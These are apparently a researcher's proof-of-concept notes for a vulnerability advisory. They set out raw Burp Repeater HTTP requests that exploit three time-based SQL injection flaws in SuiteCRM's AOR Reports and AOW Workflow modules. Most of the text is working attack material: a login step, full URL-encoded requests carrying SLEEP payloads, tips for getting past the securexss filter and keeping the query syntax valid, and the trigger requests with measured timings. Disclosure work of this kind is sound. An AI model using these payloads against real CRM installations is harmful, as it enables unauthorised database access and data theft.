# Raw HTTP sequences for Burp Suite (paste into Repeater) — VERIFIED SHAPES

Replace `<HOST>` **and the USER/PASS credentials** in section 0. Placeholders sent
literally fail the login silently and every later request 301s to
`action=Login&login_module=...` (that is the auth gate, not a payload result).
All payloads are **quote-free** — they pass SuiteCRM's global `securexss()` filter,
which only rewrites `'` to `&#039;`.

All shapes below were verified live on the PoC instance (ccb02b1e, 3 seeded
contacts, `--sleep 3`): #1 0.1 s → 27.1 s, #2 0.0 s → 27.0 s, #3 0.0 s → 9.0 s.

## 0. Login (shared) + session handling

```http
POST /index.php HTTP/1.1
Host: <HOST>
Content-Type: application/x-www-form-urlencoded

module=Users&action=Authenticate&user_name=USER&username_password=PASS&Login=Log+In&cant_login=
```

- A successful login answers **302** (to the app home); the fresh `Set-Cookie:
  PHPSESSID=...` must be copied into a `Cookie:` header on **every** tab below —
  Repeater tabs do not share cookies.
- A login that answers 301/302 with `action=Login` again = wrong credentials.

## Instance prerequisites (one-time)

- **`contacts` must not be empty**: with zero rows no WHERE ever evaluates and no
  payload can time. The PoC instance has 3 seeded contacts (PoC One/Two/Three).
- MariaDB evaluates the uncorrelated `(SELECT SLEEP(3))` **per row** here, so each
  scanned query costs ~rows × n s (3 contacts → ~9 s per query; PoC #1/#2 render
  three queries → ~27 s).

Payload design rules that shaped all three (verified against MariaDB directly):

1. **OR, not AND** — each fragment's left side never matches (`contacts.id` casts to
   0; `now+1 day` matches no row), so an AND-chained subquery short-circuits to 0 s.
2. **No `-- ` comment in AOR contexts** — the condition fragment is wrapped in
   `( … )` and the count query wraps the whole report SQL again; a comment eats the
   required closers and every query 1064s. Balance with parens instead. (AOW's
   `build_flow_query_where()` adds no wrapper parens — a comment is fine there.)
3. **Row-dependent tail, never `OR 1`** — a constant-true operand lets MariaDB
   constant-fold the entire WHERE and skip the subquery entirely (measured 0 s).

---

## 1. AOR_Conditions field-name SQLi (sibling of GHSA-4fhr-x4wr-fwqg)

**1a — store the payload condition** (user with AOR Reports edit rights). Notes:
`aor_conditions_parameter` must be **omitted entirely** (save_lines treats mere
presence as "checked", and a parameter condition fatals DetailView on this build);
`module_path` must be **scalar** (the `[0][]` array form encodes `^Contacts^`,
which `getReportParameters()` wrongly base64-unserializes → fatal); the grouped
display field is what makes the report query execute at all.

```http
POST /index.php HTTP/1.1
Host: <HOST>
Cookie: PHPSESSID=<from login>
Referer: http://<HOST>/index.php
Content-Type: application/x-www-form-urlencoded

module=AOR_Reports&action=Save&name=poc1&report_module=Contacts&aor_conditions_deleted%5B0%5D=0&aor_conditions_field%5B0%5D=id+OR+%28SELECT+SLEEP%283%29%29+OR+contacts.id&aor_conditions_operator%5B0%5D=Equal_To&aor_conditions_value_type%5B0%5D=Value&aor_conditions_value%5B0%5D=1&aor_conditions_module_path%5B0%5D=Contacts&aor_fields_deleted%5B0%5D=0&aor_fields_field%5B0%5D=first_name&aor_fields_module_path%5B0%5D=Contacts&aor_fields_display%5B0%5D=1&aor_fields_label%5B0%5D=First+Name&aor_fields_group_display%5B0%5D=0
```

The `Location:` response header contains the new report id.

**1b — trigger** (the stored field name lands raw after `contacts.`):

```http
GET /index.php?module=AOR_Reports&action=DetailView&record=<REPORT_ID> HTTP/1.1
Host: <HOST>
Cookie: PHPSESSID=<from login>
```

Expected: ≥ ~27 s (group + count + rows queries, each ~9 s).
Control: repeat 1a with `aor_conditions_field[0]=id` — fast (0.1 s).
Rendered fragment (from the MySQL general log):
`WHERE ( contacts.first_name IS NOT NULL AND ( contacts.id OR (SELECT SLEEP(3)) OR contacts.id = '1' ) AND contacts.deleted = 0 ) …`

---

## 2. AOR value_type=Date parameter override SQLi (sibling of GHSA-239h-ffjr-v957)

**2a — store a Date-type parameter condition** (`parameter=on` enables the request
override; same scalar-module_path + grouped-field rules as 1a):

```http
POST /index.php HTTP/1.1
Host: <HOST>
Cookie: PHPSESSID=<from login>
Referer: http://<HOST>/index.php
Content-Type: application/x-www-form-urlencoded

module=AOR_Reports&action=Save&name=poc2&report_module=Contacts&aor_conditions_deleted%5B0%5D=0&aor_conditions_field%5B0%5D=date_entered&aor_conditions_operator%5B0%5D=Equal_To&aor_conditions_value_type%5B0%5D=Date&aor_conditions_value%5B0%5D%5B0%5D=now&aor_conditions_value%5B0%5D%5B1%5D=plus&aor_conditions_value%5B0%5D%5B2%5D=1&aor_conditions_value%5B0%5D%5B3%5D=day&aor_conditions_parameter%5B0%5D=on&aor_conditions_module_path%5B0%5D=Contacts&aor_fields_deleted%5B0%5D=0&aor_fields_field%5B0%5D=first_name&aor_fields_module_path%5B0%5D=Contacts&aor_fields_display%5B0%5D=1&aor_fields_label%5B0%5D=First+Name&aor_fields_group_display%5B0%5D=0
```

**2b — get the condition id:**

```http
GET /index.php?module=AOR_Reports&action=getParametersForReport&record=<REPORT_ID> HTTP/1.1
Host: <HOST>
Cookie: PHPSESSID=<from login>
```

The JSON contains `"id":"<COND_ID>"`. (Do not use the DetailView parameter panel on
this build — `getReportParameters()` fatals on `^-`-encoded module_path.)

**2c — fire the override** (no edit rights needed — `action_changeReportPage` only
requires report view access). `parameter_operator` is **required** — without it the
override sets operator=null, `$aor_sql_operator_list[null]` drops the `=` and the
assembled query 1064s:

```http
GET /index.php?module=AOR_Reports&action=changeReportPage&record=<REPORT_ID>&offset=0&group=&parameter_id%5B0%5D=<COND_ID>&parameter_operator%5B0%5D=Equal_To&parameter_value%5B0%5D=now&parameter_type%5B0%5D=Date&parameter_date_value%5B0%5D=now&parameter_date_sign%5B0%5D=plus&parameter_date_number%5B0%5D=1&parameter_date_time%5B0%5D=day%29+OR+%28SELECT+SLEEP%283%29%29+OR+%28contacts.deleted+%3D+0 HTTP/1.1
Host: <HOST>
Cookie: PHPSESSID=<from login>
```

Expected: ≥ ~27 s. Control: same request with
`parameter_date_time[0]=day` — fast (0.0 s).
Rendered fragment (general log):
`WHERE ( contacts.first_name IS NOT NULL AND ( contacts.date_entered = DATE_ADD(NOW(), INTERVAL + 1 day) OR (SELECT SLEEP(3)) OR (contacts.deleted = 0) ) AND contacts.deleted = 0 ) …`

---

## 3. AOW date-condition SQLi (survivor of the CVE-2023-42632/33/34 fixes)

**3a — store a workflow whose Date condition carries the payload** (user with AOW
edit rights). Here the `-- ` comment **is** fine (`build_flow_query_where()` adds no
wrapper parens), but `DATE_FORMAT()` must keep two arguments — hence `, 1` before
the comment (a bare comment leaves DATE_FORMAT with one arg → error 1582, instant
fail):

```http
POST /index.php HTTP/1.1
Host: <HOST>
Cookie: PHPSESSID=<from login>
Referer: http://<HOST>/index.php
Content-Type: application/x-www-form-urlencoded

module=AOW_WorkFlow&action=Save&name=poc3&flow_module=Contacts&status=Active&run_when=Always&multiple_runs=1&aow_conditions_deleted%5B0%5D=0&aow_conditions_field%5B0%5D=date_entered&aow_conditions_operator%5B0%5D=Equal_To&aow_conditions_value_type%5B0%5D=Date&aow_conditions_value%5B0%5D%5B0%5D=now&aow_conditions_value%5B0%5D%5B1%5D=plus&aow_conditions_value%5B0%5D%5B2%5D=1&aow_conditions_value%5B0%5D%5B3%5D=day%29%2C+1%29+OR+%28SELECT+SLEEP%283%29%29--+%20&aow_conditions_module_path%5B0%5D%5B%5D=Contacts
```

**3b — trigger** (`action_testFlow` runs every active workflow; no ACL gate):

```http
GET /index.php?module=AOW_WorkFlow&action=testFlow HTTP/1.1
Host: <HOST>
Cookie: PHPSESSID=<from login>
```

Expected: ≥ ~9 s while the payload workflow is Active; save it Inactive (or delete)
for the fast baseline (0.0 s).
Rendered fragment (general log):
`WHERE DATE_FORMAT(contacts.date_entered, '%Y-%m-%d %H:%i') = DATE_FORMAT(DATE_ADD(UTC_TIMESTAMP(), INTERVAL + 1 day), 1) OR (SELECT SLEEP(3))-- …`
Fallback trigger if `testFlow` is ACL-blocked on your instance: run the
`AOW Workflow` scheduler job (Admin → Schedulers → execute now) or wait for cron.

---

## Evidence checklist for the advisory

- [x] Timed payload vs control for all three (scripts: 27.1 / 27.0 / 9.0 s vs
      0.1 / 0.0 / 0.0 s at `--sleep 3`) — rerun in Burp for screenshots.
- [x] MySQL general-log excerpts showing the assembled queries with the injected
      fragments (captured 2026-11-03 on the PoC instance; recapture per finding for
      the advisory attachments).
- [ ] Response of the payload request showing normal report HTML (proves no SQL
      error path) — grab from the Burp replays.
- [ ] Version proof: `sugar_version` / about page + commit `ccb02b1e`.

Live evidence records on the PoC instance (kept for Burp replays):

| # | control | payload |
|---|---------|---------|
| 1 | report `d680ab1c-5162-4360-a6cb-8c9672910025` | report `ae2760e9-7b46-4d2d-96e5-42f6197c25b7` |
| 2 | (2b/2c with `parameter_date_time[0]=day`) | report `93304de0-332c-4e3a-8245-8b2804308bb6`, cond `fb5e95da-079c-452b-a17e-28919e5bd9af` |
| 3 | workflow `bc454dcd-016c-40f7-98e5-407b06be069b` | workflow `2c601f7d-a6f5-49e3-b827-bda45e80f847` |
